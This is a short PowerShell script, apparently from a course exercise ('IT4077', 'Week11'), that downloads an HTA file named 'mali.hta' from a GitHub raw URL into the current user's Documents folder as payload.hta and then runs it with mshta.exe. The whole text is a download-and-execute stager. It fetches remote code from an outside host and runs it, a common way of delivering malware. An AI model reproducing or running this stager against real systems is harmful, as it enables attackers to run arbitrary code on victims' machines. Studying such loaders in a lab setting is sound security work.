
$url = "https://raw.githubusercontent.com/EvaStanAccount/IT4077/refs/heads/Main/Week11/mali.hta"
$Username = $env:USERNAME
$filepath = "C:\Users\"+$Username+"\Documents\payload.hta"
(new-object net.webclient).downloadfile($url,$filepath)

C:\Windows\system32\mshta.exe $filepath